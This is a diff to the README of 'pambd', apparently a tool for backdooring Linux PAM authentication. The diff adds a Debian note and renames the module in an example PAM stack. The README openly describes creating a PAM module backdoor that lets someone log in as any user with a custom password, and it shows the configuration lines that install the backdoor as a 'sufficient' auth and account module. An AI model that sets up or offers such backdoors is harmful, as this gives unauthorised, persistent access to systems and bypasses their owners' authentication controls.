@@ -4,6 +4,10 @@ pambd
 Introduction
 ------------
 
+Note: the software in this repository is targeted toward Debian.
+Some paths and configurations will be different on other
+distributions of Linux. Adjust the gen.sh bash script appropriately.
+
 This trick shows you how to create a PAM module backdoor that 
 allows to execute an user login with your own custom password.
 
@@ -53,8 +57,8 @@ nauth           sufficient      pam_rootok.so
 auth            sufficient      pam_unix.so     # This must be 'sufficient'.
 account         required        pam_unix.so
 session         required        pam_unix.so
-auth            sufficient      pambd.so        # This is our pam backdoor.
-account         sufficient      pambd.so        # --
+auth            sufficient      pam_bd.so        # This is our pam backdoor.
+account         sufficient      pam_bd.so        # --
 ```
 
 
